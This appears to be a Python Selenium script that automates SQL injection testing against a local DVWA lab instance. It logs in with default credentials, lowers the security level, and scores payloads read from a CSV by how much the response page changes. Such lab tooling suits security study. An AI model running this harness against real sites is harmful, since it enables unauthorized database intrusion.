import urllib.parse
import csv
import urllib.request
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support import expected_conditions as EC

#The credentials for DVWA
usrnme = 'admin'
psswd = 'password'

#The browser we are using and the URL to go to
browser = webdriver.Chrome()
browser.get(('http://localhost/login.php'))

#Find the username and password field and submit the credentials
username = browser.find_element_by_name('username')
username.send_keys(usrnme)
password = browser.find_element_by_name('password')
password.send_keys(psswd)
submitButton = browser.find_element_by_name('Login')
submitButton.click()

#Set the DVWA security level to low
browser.get(('http://localhost/security.php'))
security = Select(browser.find_element_by_name('security'))
security.select_by_value('low')
submitButton = browser.find_element_by_name('seclev_submit')
submitButton.click()

#Collect the base source for the character comparison later on
browser.get('http://localhost/vulnerabilities/sqli/')
base_src = browser.page_source

#Create the CSV with the payloads and scores 
fields = ['payload', 'score']
with open('scoring.csv', 'w') as f:
    writer = csv.writer(f)
    writer.writerow(fields)

#Open the dataset CSV
with open('testing.csv', 'r') as f:
  reader = csv.reader(f)
  payloads = list(reader)

#Loop through the CSV line by line
for line in payloads:

#Create our SQL Injection exploit with the URL
    base_url = 'http://localhost/vulnerabilities/sqli/?id='
    padding = '&Submit=Submit#'
    
    #Encode the payload to be used in URL's
    new_payload = urllib.parse.quote(''.join(line).encode())

#Merge the base_url, passing and new payload to create a new URL
    new_url= []
    new_url.append(base_url)
    new_url.append(new_payload)
    new_url.append(padding)
    new_url = ''.join(new_url)

#Get the source code from our new URL
    browser.get(new_url)
    new_src = browser.page_source

#Check if the base source is the same as our new source, if not, check which is larger then minus smaller length
#from the biggest length. 
#Score equals the left over number
    if base_src != new_src:
        if len(base_src) > len(new_src):
            score = len(base_src) - len(new_src)
        else:
            score = len(new_src) - len(base_src)
    else:
        score = 0

#Write the payload and its score to the new CSV
    with open('scoring.csv', 'a') as f:
        writer = csv.writer(f)
        writer.writerow([line, score])
